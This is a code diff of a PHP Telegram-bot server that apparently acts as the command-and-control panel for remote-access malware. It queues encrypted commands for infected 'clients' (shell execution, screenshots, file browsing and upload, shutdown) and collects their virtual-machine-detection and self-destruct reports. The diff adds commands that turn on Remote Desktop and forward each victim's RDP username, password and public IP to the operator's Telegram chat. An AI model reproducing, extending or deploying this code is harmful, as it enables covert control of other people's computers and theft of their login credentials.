@@ -1,15 +1,18 @@
 <?php
 require_once __DIR__ . '/Config.php';
 
-class LoggerBot {
+class LoggerBot
+{
     private $pdo;
 
-    public function __construct() {
+    public function __construct()
+    {
         $this->initDatabase();
         $this->initDirectories();
     }
 
-    private function initDatabase() {
+    private function initDatabase()
+    {
         try {
             $dsn = "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4";
             $this->pdo = new PDO($dsn, Config::$DB_USER, Config::$DB_PASS);
@@ -21,7 +24,8 @@ class LoggerBot {
         }
     }
 
-    private function initDirectories() {
+    private function initDirectories()
+    {
         $dirs = [Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR, dirname(Config::$ERROR_LOG)];
         foreach ($dirs as $dir) {
             if (!is_dir($dir)) {
@@ -30,17 +34,22 @@ class LoggerBot {
         }
     }
 
-    public function handleRequest() {
+    public function handleRequest()
+    {
         $rawInput = file_get_contents('php://input');
         $input = json_decode($rawInput, true) ?: [];
         $this->logWebhook("Raw request: $rawInput, POST: " . json_encode($_POST) . ", FILES: " . json_encode($_FILES));
 
-        if (isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) && 
-            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET) {
+        if (
+            isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) &&
+            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET
+        ) {
             $this->handleWebhook($input);
-        } elseif ((isset($_SERVER['HTTP_X_SECRET_TOKEN']) && $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) || 
-                 (isset($input['token']) && $input['token'] === Config::$SECRET_TOKEN) || 
-                 (isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN)) {
+        } elseif (
+            (isset($_SERVER['HTTP_X_SECRET_TOKEN']) && $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) ||
+            (isset($input['token']) && $input['token'] === Config::$SECRET_TOKEN) ||
+            (isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN)
+        ) {
             $this->handleClientRequest($input);
         } else {
             http_response_code(401);
@@ -49,7 +58,8 @@ class LoggerBot {
         }
     }
 
-    private function handleWebhook($update) {
+    private function handleWebhook($update)
+    {
         if (!$update) {
             http_response_code(400);
             $this->logError("Invalid webhook request");
@@ -57,17 +67,18 @@ class LoggerBot {
         }
 
         $this->logWebhook(json_encode($update));
-        
+
         if (isset($update['callback_query'])) {
             $this->handleCallbackQuery($update['callback_query']);
         } elseif (isset($update['message'])) {
             $this->processUpdate($update);
         }
-        
+
         http_response_code(200);
     }
 
-    private function handleCallbackQuery($callbackQuery) {
+    private function handleCallbackQuery($callbackQuery)
+    {
         $chatId = $callbackQuery['message']['chat']['id'] ?? null;
         $userId = $callbackQuery['from']['id'] ?? null;
         $data = $callbackQuery['data'] ?? null;
@@ -157,7 +168,8 @@ class LoggerBot {
         );
     }
 
-    private function setSelectedClient($userId, $clientId) {
+    private function setSelectedClient($userId, $clientId)
+    {
         try {
             $stmt = $this->pdo->prepare(
                 "INSERT INTO user_selections (user_id, selected_client, updated_at) 
@@ -171,7 +183,8 @@ class LoggerBot {
         }
     }
 
-    private function getSelectedClient($userId) {
+    private function getSelectedClient($userId)
+    {
         try {
             $stmt = $this->pdo->prepare("SELECT selected_client FROM user_selections WHERE user_id = ?");
             $stmt->execute([$userId]);
@@ -185,7 +198,8 @@ class LoggerBot {
         }
     }
 
-    private function handleClientRequest($input) {
+    private function handleClientRequest($input)
+    {
         header('Content-Type: application/json');
 
         $data = array_merge($input, $_POST);
@@ -221,16 +235,159 @@ class LoggerBot {
             case 'report_update':
                 $response = $this->handleUpdateReport($data);
                 break;
+            case 'report_rdp':
+                $response = $this->handleRDPReport($data);
+                break;
+            case 'enable_rdp':
+                $response = $this->handleEnableRDP($data);
+                break;
+            case 'disable_rdp':
+                $response = $this->handleDisableRDP($data);
+                break;
             default:
                 $response = ['error' => 'Unknown action'];
                 break;
         }
 
-        $this->logWebhook("Client request response for action: $action, client_id: $clientId, response: " . json_encode($response));
+        $this->logWebhook("Client response for action: $action, client_id: $clientId, response: " . json_encode($response));
         echo json_encode($response);
     }
 
-    private function handleSelfDestructReport($data) {
+    private function handleRDPReport($data)
+    {
+        try {
+            $this->logWebhook("RDP Report: " . json_encode($data, JSON_UNESCAPED_UNICODE));
+    
+            $client_id = $data['client_id'] ?? null;
+            $rdp_info = $data['rdp_info'] ?? null;
+    
+            if (!$client_id || !$rdp_info) {
+                $this->logError("Invalid RDP report: missing client_id or rdp_info");
+                http_response_code(400);
+                return ['error' => 'Missing client_id or rdp_info'];
+            }
+    
+            if (!is_string($rdp_info) || !str_contains($rdp_info, '::')) {
+                $this->logError("Invalid RDP info format for client_id: $client_id, data: " . substr($rdp_info, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid RDP info format'];
+            }
+    
+            $decrypted_info = $this->decrypt($rdp_info);
+            if ($decrypted_info === '') {
+                $this->logError("Failed to decrypt RDP info for client_id: $client_id");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+    
+            $rdp_data = json_decode($decrypted_info, true);
+            if (!$rdp_data || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logError("Invalid RDP data format for client_id: $client_id, decrypted: " . substr($decrypted_info, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+    
+            // Log to database
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_logs (client_id, log_type, message, created_at) 
+                VALUES (?, 'rdp', ?, NOW())"
+            );
+            $stmt->execute([$client_id, $decrypted_info]);
+    
+            // Update client status
+            $stmt = $this->pdo->prepare(
+                "UPDATE clients SET ip_address = ?, last_seen = NOW(), is_online = 1 
+                WHERE client_id = ?"
+            );
+            $ip = $rdp_data['public_ip'] ?? ($rdp_data['local_ip'] ?? 'unknown');
+            $stmt->execute([$ip, $client_id]);
+    
+            // Prepare Telegram message
+            $message = "🖥️ RDP Status Update:\n";
+            $message .= "Client ID: $client_id\n";
+            if (isset($rdp_data['status']) && $rdp_data['status'] === 'success') {
+                $message .= "Status: " . ($rdp_data['username'] ? "Enabled" : "Disabled") . "\n";
+                if ($rdp_data['username']) {
+                    $message .= "Local IP: " . ($rdp_data['local_ip'] ?? 'N/A') . "\n";
+                    $message .= "Public IP: " . ($rdp_data['public_ip'] ?? 'N/A') . "\n";
+                    $message .= "Username: {$rdp_data['username']}\n";
+                    $message .= "Password: {$rdp_data['password']}\n";
+                    $message .= "Connect using: mstsc /v:" . ($rdp_data['public_ip'] ?? $rdp_data['local_ip'] ?? 'unknown') . "\n";
+                } else {
+                    $message .= "Details: {$rdp_data['message']}\n";
+                }
+            } else {
+                $message .= "Status: Failed\n";
+                $message .= "Error: " . ($rdp_data['message'] ?? 'Unknown error') . "\n";
+            }
+    
+            $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+            $this->logWebhook("RDP report processed for client_id: $client_id");
+    
+            return ['status' => 'success'];
+        } catch (Exception $e) {
+            $this->logError("RDP report failed for client_id: $client_id, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Report failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleEnableRDP($data)
+    {
+        try {
+            $client_id = $data['client_id'] ?? null;
+            if (!$client_id) {
+                $this->logError("Enable RDP: Missing client_id");
+                http_response_code(400);
+                return ['error' => 'Missing client_id'];
+            }
+
+            $command_data = ['type' => 'enable_rdp', 'params' => []];
+            $encrypted_command = $this->encrypt(json_encode($command_data));
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_commands (client_id, command, status, created_at) 
+                VALUES (?, ?, 'pending', NOW())"
+            );
+            $stmt->execute([$client_id, $encrypted_command]);
+
+            $this->logWebhook("Enable RDP command queued for client_id: $client_id");
+            return ['status' => 'success', 'message' => 'Enable RDP command queued'];
+        } catch (Exception $e) {
+            $this->logError("Enable RDP failed: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Enable RDP failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleDisableRDP($data)
+    {
+        try {
+            $client_id = $data['client_id'] ?? null;
+            if (!$client_id) {
+                $this->logError("Disable RDP: Missing client_id");
+                http_response_code(400);
+                return ['error' => 'Missing client_id'];
+            }
+
+            $command_data = ['type' => 'disable_rdp', 'params' => []];
+            $encrypted_command = $this->encrypt(json_encode($command_data));
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO client_commands (client_id, command, status, created_at) 
+                VALUES (?, ?, 'pending', NOW())"
+            );
+            $stmt->execute([$client_id, $encrypted_command]);
+
+            $this->logWebhook("Disable RDP command queued for client_id: $client_id");
+            return ['status' => 'success', 'message' => 'Disable RDP command queued'];
+        } catch (Exception $e) {
+            $this->logError("Disable RDP failed: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Disable RDP failed: ' . $e->getMessage()];
+        }
+    }
+
+    private function handleSelfDestructReport($data)
+    {
         try {
             $this->logWebhook("Self-destruct report: " . json_encode($data));
 
@@ -260,14 +417,12 @@ class LoggerBot {
                 $this->logWebhook("No self-destruct report provided for client_id: $clientId");
             }
 
-            // اطلاع‌رسانی به ادمین تلگرام
             if ($report) {
                 $reportData = json_decode($report, true);
                 $message = "🚨 Self-destruct initiated for client $clientId!\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                 $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
             }
 
-            // لاگ در دیتابیس
             try {
                 $stmt = $this->pdo->prepare(
                     "INSERT INTO client_logs (client_id, log_type, message, created_at) 
@@ -287,7 +442,8 @@ class LoggerBot {
         }
     }
 
-    private function handleUpdateReport($data) {
+    private function handleUpdateReport($data)
+    {
         try {
             $this->logWebhook("Update report: " . json_encode($data));
 
@@ -317,14 +473,12 @@ class LoggerBot {
                 $this->logWebhook("No update report provided for client_id: $clientId");
             }
 
-            // اطلاع‌رسانی به ادمین تلگرام
             if ($report) {
                 $reportData = json_decode($report, true);
                 $message = "🔄 Client $clientId updated to version {$reportData['new_version']}.\nDetails: " . json_encode($reportData, JSON_PRETTY_PRINT);
                 $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
             }
 
-            // لاگ در دیتابیس
             try {
                 $stmt = $this->pdo->prepare(
                     "INSERT INTO client_logs (client_id, log_type, message, created_at) 
@@ -344,7 +498,8 @@ class LoggerBot {
         }
     }
 
-    private function handleUploadVMStatus($data) {
+    private function handleUploadVMStatus($data)
+    {
         try {
             $this->logWebhook("Upload VM status: " . json_encode($data));
 
@@ -387,11 +542,10 @@ class LoggerBot {
                 throw new Exception("Database insertion failed: " . $e->getMessage());
             }
 
-            // اطلاع‌رسانی به ادمین تلگرام
             if ($vmDetails) {
                 $vmData = json_decode($vmDetails, true);
                 $isVM = $vmData['is_vm'] ?? false;
-                $message = $isVM 
+                $message = $isVM
                     ? "⚠️ Virtual Machine detected on client $clientId!\nDetails: " . json_encode($vmData['checks'], JSON_PRETTY_PRINT)
                     : "✅ Physical Machine confirmed for client $clientId.";
                 $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
@@ -407,7 +561,8 @@ class LoggerBot {
         }
     }
 
-    private function updateClientStatus($clientId) {
+    private function updateClientStatus($clientId)
+    {
         try {
             $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
             $stmt = $this->pdo->prepare(
@@ -422,7 +577,8 @@ class LoggerBot {
         }
     }
 
-    private function getClientCommands($clientId) {
+    private function getClientCommands($clientId)
+    {
         try {
             $stmt = $this->pdo->prepare(
                 "SELECT id, command FROM client_commands 
@@ -431,7 +587,7 @@ class LoggerBot {
             );
             $stmt->execute([$clientId]);
             $commands = $stmt->fetchAll();
-    
+
             $this->logWebhook("Fetched commands for client_id: $clientId, count: " . count($commands));
             return ['commands' => $commands];
         } catch (PDOException $e) {
@@ -440,7 +596,8 @@ class LoggerBot {
         }
     }
 
-    private function handleUploadData($data) {
+    private function handleUploadData($data)
+    {
         try {
             $this->logWebhook("Upload data: " . json_encode($data) . ", FILES: " . json_encode($_FILES));
 
@@ -519,7 +676,8 @@ class LoggerBot {
         }
     }
 
-    private function handleCommandResponse($data) {
+    private function handleCommandResponse($data)
+    {
         try {
             $commandId = $data['command_id'] ?? null;
             $result = isset($data['result']) ? $this->decrypt($data['result']) : '';
@@ -527,14 +685,14 @@ class LoggerBot {
                 $this->logError("Missing command_id in command response");
                 return ['error' => 'Missing command_id'];
             }
-    
+
             $resultData = json_decode($result, true);
             $stmt = $this->pdo->prepare(
                 "UPDATE client_commands SET status = 'completed', result = ?, completed_at = NOW() 
                 WHERE id = ?"
             );
             $stmt->execute([strlen($result) > 65000 ? 'Result too large, sent as file' : $result, $commandId]);
-    
+
             $stmt = $this->pdo->prepare(
                 "SELECT client_id, command FROM client_commands WHERE id = ?"
             );
@@ -546,7 +704,7 @@ class LoggerBot {
                 $commandJson = json_decode($decryptedCommand, true);
                 $commandType = $commandJson['type'] ?? 'unknown';
                 $commandParams = $commandJson['params'] ?? [];
-                
+
                 if ($commandType === 'file_operation' && isset($commandParams['action'])) {
                     if ($commandParams['action'] === 'list' && isset($resultData['files'])) {
                         $this->sendFileList($clientId, $resultData['files'], $commandParams['path']);
@@ -568,6 +726,12 @@ class LoggerBot {
                         $message .= "Failed - " . ($resultData['message'] ?? 'Unknown error');
                     }
                     $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, $message);
+                } elseif ($commandType === 'enable_rdp' || $commandType === 'disable_rdp') {
+                    $status = isset($resultData['status']) && $resultData['status'] === 'success' ? 'successful' : 'failed';
+                    $this->sendTelegramMessage(
+                        Config::$ADMIN_CHAT_ID,
+                        "Command '$commandType' on client $clientId: $status\nDetails: " . ($resultData['message'] ?? 'No details')
+                    );
                 } else {
                     $this->sendTelegramMessage(
                         Config::$ADMIN_CHAT_ID,
@@ -575,7 +739,7 @@ class LoggerBot {
                     );
                 }
             }
-    
+
             $this->logWebhook("Updated command response for command_id: $commandId, result: " . substr($result, 0, 50));
             return ['status' => 'success'];
         } catch (PDOException $e) {
@@ -584,7 +748,8 @@ class LoggerBot {
         }
     }
 
-    private function sendFileList($clientId, $files, $path) {
+    private function sendFileList($clientId, $files, $path)
+    {
         $message = "Files in `$path`:\n";
         $keyboard = ['inline_keyboard' => []];
         $row = [];
@@ -606,7 +771,7 @@ class LoggerBot {
         if ($row) {
             $keyboard['inline_keyboard'][] = $row;
         }
-        
+
         if (strlen($message) > 4000) {
             $tempFile = Config::$UPLOAD_DIR . "file_list_$clientId.txt";
             file_put_contents($tempFile, $message);
@@ -617,7 +782,8 @@ class LoggerBot {
         }
     }
 
-    private function sendFileContent($clientId, $content, $filePath) {
+    private function sendFileContent($clientId, $content, $filePath)
+    {
         if (strlen($content) > 4000) {
             $tempFile = Config::$UPLOAD_DIR . "file_content_$clientId.txt";
             file_put_contents($tempFile, $content);
@@ -629,7 +795,8 @@ class LoggerBot {
         }
     }
 
-    private function processUpdate($update) {
+    private function processUpdate($update)
+    {
         if (!isset($update['message'])) {
             return;
         }
@@ -671,7 +838,8 @@ class LoggerBot {
         }
     }
 
-    private function isUserAuthorized($userId) {
+    private function isUserAuthorized($userId)
+    {
         try {
             $stmt = $this->pdo->prepare("SELECT is_admin FROM users WHERE user_id = ? AND is_active = 1");
             $stmt->execute([$userId]);
@@ -685,7 +853,8 @@ class LoggerBot {
         }
     }
 
-    private function clientExists($clientId) {
+    private function clientExists($clientId)
+    {
         try {
             $stmt = $this->pdo->prepare("SELECT 1 FROM clients WHERE client_id = ?");
             $stmt->execute([$clientId]);
@@ -696,7 +865,8 @@ class LoggerBot {
         }
     }
 
-    private function sendClientKeyboard($chatId) {
+    private function sendClientKeyboard($chatId)
+    {
         $clients = $this->getClientStatus();
         $this->logWebhook("Fetched clients for keyboard: " . json_encode($clients));
 
@@ -729,7 +899,8 @@ class LoggerBot {
         $this->logWebhook("Telegram API response for keyboard: " . $response);
     }
 
-    private function sendCommandKeyboard($chatId, $message) {
+    private function sendCommandKeyboard($chatId, $message)
+    {
         $commands = [
             '/status' => 'System Status',
             '/screenshot' => 'Take Screenshot',
@@ -752,7 +923,9 @@ class LoggerBot {
             '/restart' => 'Restart',
             '/listusers' => 'List Users',
             '/addadmin' => 'Add Admin',
-            '/end_task' => 'End Task' // اضافه شده
+            '/end_task' => 'End Task',
+            '/enable_rdp' => 'Enable RDP',
+            '/disable_rdp' => 'Disable RDP'
         ];
 
         $keyboard = ['inline_keyboard' => []];
@@ -772,7 +945,8 @@ class LoggerBot {
         $this->sendTelegramMessage($chatId, $message, ['reply_markup' => $keyboard]);
     }
 
-    private function processCommand($command, $recipient, $isClient = false) {
+    private function processCommand($command, $recipient, $isClient = false)
+    {
         $command = trim($command);
         $this->logCommand($recipient, $command);
 
@@ -846,6 +1020,16 @@ class LoggerBot {
                 $response['data'] = "End task command queued for process: {$matches[1]}";
                 break;
 
+            case preg_match('/^\/enable_rdp$/', $command):
+                $commandData = ['type' => 'enable_rdp', 'params' => []];
+                $response['data'] = 'Enable RDP command queued';
+                break;
+
+            case preg_match('/^\/disable_rdp$/', $command):
+                $commandData = ['type' => 'disable_rdp', 'params' => []];
+                $response['data'] = 'Disable RDP command queued';
+                break;
+
             case preg_match('/^\/signout$/', $command):
                 $commandData = ['type' => 'system_command', 'params' => ['command' => 'signout']];
                 $response['data'] = 'Sign out command queued';
@@ -899,7 +1083,8 @@ class LoggerBot {
         return $response;
     }
 
-    private function queueClientCommand($clientId, $commandData) {
+    private function queueClientCommand($clientId, $commandData)
+    {
         try {
             $encryptedCommand = $this->encrypt(json_encode($commandData));
             $stmt = $this->pdo->prepare(
@@ -913,7 +1098,8 @@ class LoggerBot {
         }
     }
 
-    private function encrypt($data) {
+    private function encrypt($data)
+    {
         $iv = openssl_random_pseudo_bytes(16);
         $ciphertext = openssl_encrypt(
             $data,
@@ -929,7 +1115,8 @@ class LoggerBot {
         return $ciphertext . '::' . base64_encode($iv);
     }
 
-    private function decrypt($encryptedData) {
+    private function decrypt($encryptedData)
+    {
         try {
             if (!$encryptedData || !is_string($encryptedData)) {
                 $this->logError("Invalid encrypted data: Not a string or empty: " . json_encode($encryptedData));
@@ -980,31 +1167,33 @@ class LoggerBot {
         }
     }
 
-    private function sendTelegramMessage($chatId, $text, $options = []) {
+    private function sendTelegramMessage($chatId, $text, $options = [])
+    {
         $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
-        
+
         $parseMode = stripos($text, 'Error') !== false ? null : 'Markdown';
-        
+
         $data = array_merge([
             'chat_id' => $chatId,
             'text' => $text
         ], $options);
-    
+
         if ($parseMode) {
             $data['parse_mode'] = $parseMode;
         }
-    
+
         if (isset($data['reply_markup'])) {
             $data['reply_markup'] = json_encode($data['reply_markup']);
         }
-    
+
         $this->logWebhook("Sending Telegram message to chat_id: $chatId, payload: " . json_encode($data));
         $response = $this->makeCurlRequest($url, $data, false);
         $this->logWebhook("Telegram sendMessage response: " . $response);
         return $response;
     }
 
-    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument') {
+    private function sendTelegramFile($chatId, $filePath, $method = 'sendDocument')
+    {
         $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/$method";
         $data = [
             'chat_id' => $chatId,
@@ -1012,22 +1201,23 @@ class LoggerBot {
         ];
         $this->logWebhook("Sending Telegram file to chat_id: $chatId, method: $method, file: $filePath");
         $response = $this->makeCurlRequest($url, $data, true);
-        $this->logWebhook("Telegram sendFile response: " . $response);
+        $this->logWebhook("Telegram sendFile response: $response");
         return $response;
     }
 
-    private function makeCurlRequest($url, $data, $isFile = false) {
+    private function makeCurlRequest($url, $data, $isFile = false)
+    {
         $ch = curl_init($url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_POST, true);
-        
+
         if ($isFile) {
             curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
         } else {
             curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
             curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
         }
-        
+
         $response = curl_exec($ch);
         if (curl_errno($ch)) {
             $this->logError("cURL error: " . curl_error($ch) . ", URL: $url");
@@ -1036,7 +1226,8 @@ class LoggerBot {
         return $response;
     }
 
-    private function getClientStatus() {
+    private function getClientStatus()
+    {
         try {
             $stmt = $this->pdo->prepare("SELECT client_id, ip_address, is_online, last_seen FROM clients WHERE last_seen > NOW() - INTERVAL 1 HOUR");
             $stmt->execute();
@@ -1049,7 +1240,8 @@ class LoggerBot {
         }
     }
 
-    private function sendSystemStatus($recipient, $isClient = false) {
+    private function sendSystemStatus($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "System status command queued";
         }
@@ -1057,7 +1249,8 @@ class LoggerBot {
         return "Status command queued";
     }
 
-    private function handleScreenshot($recipient, $isClient = false) {
+    private function handleScreenshot($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Screenshot command queued";
         }
@@ -1065,7 +1258,8 @@ class LoggerBot {
         return "Screenshot command queued";
     }
 
-    private function handleFileUpload($recipient, $filePath, $isClient = false) {
+    private function handleFileUpload($recipient, $filePath, $isClient = false)
+    {
         if ($isClient) {
             return "File upload command queued";
         }
@@ -1073,7 +1267,8 @@ class LoggerBot {
         return "File upload command queued";
     }
 
-    private function executeCommand($recipient, $command, $isClient = false) {
+    private function executeCommand($recipient, $command, $isClient = false)
+    {
         if ($isClient) {
             return "Execute command queued";
         }
@@ -1081,7 +1276,8 @@ class LoggerBot {
         return "Execute command queued";
     }
 
-    private function sendLogs($recipient, $isClient = false) {
+    private function sendLogs($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Logs command not supported on client";
         }
@@ -1100,7 +1296,8 @@ class LoggerBot {
         return "Logs sent";
     }
 
-    private function getHosts($recipient, $isClient = false) {
+    private function getHosts($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Hosts command queued";
         }
@@ -1108,7 +1305,8 @@ class LoggerBot {
         return "Hosts command queued";
     }
 
-    private function listScreenshots($recipient, $isClient = false) {
+    private function listScreenshots($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Screenshots command not supported on client";
         }
@@ -1119,7 +1317,8 @@ class LoggerBot {
         return "Screenshot list sent";
     }
 
-    private function browseDirectory($recipient, $path, $isClient = false) {
+    private function browseDirectory($recipient, $path, $isClient = false)
+    {
         if ($isClient) {
             return "Browse directory command queued";
         }
@@ -1127,7 +1326,8 @@ class LoggerBot {
         return "Browse directory command queued";
     }
 
-    private function getSystemInfo($recipient, $isClient = false) {
+    private function getSystemInfo($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "System info command queued";
         }
@@ -1135,7 +1335,8 @@ class LoggerBot {
         return "System info command queued";
     }
 
-    private function goToUrl($recipient, $url, $isClient = false) {
+    private function goToUrl($recipient, $url, $isClient = false)
+    {
         if ($isClient) {
             return "Open URL command queued";
         }
@@ -1143,7 +1344,8 @@ class LoggerBot {
         return "Open URL command queued";
     }
 
-    private function systemShutdown($recipient, $isClient = false) {
+    private function systemShutdown($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Shutdown command queued";
         }
@@ -1151,17 +1353,19 @@ class LoggerBot {
         return "Shutdown command queued";
     }
 
-    private function testTelegram($recipient, $isClient = false) {
+    private function testTelegram($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Test Telegram command not supported on client";
         }
         $response = $this->makeCurlRequest("https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getMe", [], false);
-        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed";
+        $message = json_decode($response, true)['ok'] ? "Telegram API is working" : "Telegram API test failed.";
         $this->sendTelegramMessage($recipient, $message);
         return $message;
     }
 
-    private function uploadFromUrl($recipient, $url, $isClient = false) {
+    private function uploadFromUrl($recipient, $url, $isClient = false)
+    {
         if ($isClient) {
             return "Upload from URL command queued";
         }
@@ -1169,7 +1373,8 @@ class LoggerBot {
         return "Upload from URL command queued";
     }
 
-    private function listTasks($recipient, $isClient = false) {
+    private function listTasks($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "List tasks command queued";
         }
@@ -1177,7 +1382,8 @@ class LoggerBot {
         return "List tasks command queued";
     }
 
-    private function manageStartup($recipient, $isClient = false) {
+    private function manageStartup($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Startup command not supported on client";
         }
@@ -1185,7 +1391,8 @@ class LoggerBot {
         return "Startup command not supported";
     }
 
-    private function signOut($recipient, $isClient = false) {
+    private function signOut($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Sign out command queued";
         }
@@ -1193,7 +1400,8 @@ class LoggerBot {
         return "Sign out command queued";
     }
 
-    private function systemSleep($recipient, $isClient = false) {
+    private function systemSleep($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Sleep command queued";
         }
@@ -1201,7 +1409,8 @@ class LoggerBot {
         return "Sleep command queued";
     }
 
-    private function systemRestart($recipient, $isClient = false) {
+    private function systemRestart($recipient, $isClient = false)
+    {
         if ($isClient) {
             return "Restart command queued";
         }
@@ -1209,7 +1418,8 @@ class LoggerBot {
         return "Restart command queued";
     }
 
-    private function addAdmin($recipient, $newAdminId, $isClient = false) {
+    private function addAdmin($recipient, $newAdminId, $isClient = false)
+    {
         try {
             $stmt = $this->pdo->prepare(
                 "INSERT INTO users (user_id, is_active, is_admin, created_at) 
@@ -1230,12 +1440,13 @@ class LoggerBot {
         return $message;
     }
 
-    private function listUsers($recipient, $isClient = false) {
+    private function listUsers($recipient, $isClient = false)
+    {
         try {
             $stmt = $this->pdo->prepare("SELECT user_id, is_admin FROM users WHERE is_active = 1");
             $stmt->execute();
             $users = $stmt->fetchAll();
-            
+
             $message = "Active users:\n";
             foreach ($users as $user) {
                 $role = $user['is_admin'] ? '(Admin)' : '(User)';
@@ -1254,7 +1465,8 @@ class LoggerBot {
         return "Users listed";
     }
 
-    private function logCommand($recipient, $command, $response = '') {
+    private function logCommand($recipient, $command, $response = '')
+    {
         try {
             $userId = $recipient;
             if (isset($GLOBALS['update']['message']['from']['id'])) {
@@ -1270,42 +1482,47 @@ class LoggerBot {
         }
     }
 
-    private function logError($message) {
+    private function logError($message)
+    {
         $logMessage = "[" . date('Y-m-d H:i:s') . "] ERROR: $message\n";
         file_put_contents(Config::$ERROR_LOG, $logMessage, FILE_APPEND);
         $this->sendTelegramMessage(Config::$ADMIN_CHAT_ID, "Error: $message");
     }
 
-    private function logWebhook($message) {
+    private function logWebhook($message)
+    {
         $logMessage = "[" . date('Y-m-d H:i:s') . "] WEBHOOK: $message\n";
         file_put_contents(Config::$WEBHOOK_LOG, $logMessage, FILE_APPEND);
     }
 
-    private function sendHelpMessage($recipient, $isClient = false) {
+    private function sendHelpMessage($recipient, $isClient = false)
+    {
         $message = "Available commands:\n" .
-                   "/start - Show client list\n" .
-                   "/select <client_id> - Select a client\n" .
-                   "/status - System status\n" .
-                   "/screenshot - Take screenshot\n" .
-                   "/exec <command> - Execute command\n" .
-                   "/hosts - View hosts file\n" .
-                   "/browse <path> - Browse directory\n" .
-                   "/browse_recursive <path> - Recursive directory listing\n" .
-                   "/get-info - System info\n" .
-                   "/go <url> - Open URL\n" .
-                   "/shutdown - Shutdown system\n" .
-                   "/upload <file_path> - Upload file\n" .
-                   "/upload_url <url> - Upload from URL\n" .
-                   "/tasks - List running tasks\n" .
-                   "/end_task <process_name> - End a running process\n" .
-                   "/signout - Sign out\n" .
-                   "/sleep - Sleep system\n" .
-                   "/restart - Restart system\n" .
-                   "/logs - View server logs\n" .
-                   "/screens - List screenshots\n" .
-                   "/test_telegram - Test Telegram API\n" .
-                   "/listusers - List active users\n" .
-                   "/addadmin <user_id> - Add admin";
+            "/start - Show client list\n" .
+            "/select <client_id> - Select a client\n" .
+            "/status - System status\n" .
+            "/screenshot - Take screenshot\n" .
+            "/exec <command> - Execute command\n" .
+            "/hosts - View hosts file\n" .
+            "/browse <path> - Browse directory\n" .
+            "/browse_recursive <path> - Recursive directory listing\n" .
+            "/get-info - System info\n" .
+            "/go <url> - Open URL\n" .
+            "/shutdown - Shutdown system\n" .
+            "/upload <file_path> - Upload file\n" .
+            "/upload_url <file_url> - Upload from URL\n" .
+            "/tasks - List running tasks\n" .
+            "/end_task <process_name> - End a process\n" .
+            "/enable_rdp - Enable RDP\n" .
+            "/disable_rdp - Disable RDP\n" .
+            "/signout - Sign out\n" .
+            "/sleep - Sleep system\n" .
+            "/restart - Restart system\n" .
+            "/logs - View server logs\n" .
+            "/screens - List screenshots\n" .
+            "/test_telegram - Test Telegram API\n" .
+            "/listusers - List active users\n" .
+            "/addadmin <user_id> - Add admin";
         if ($isClient) {
             return $message;
         }
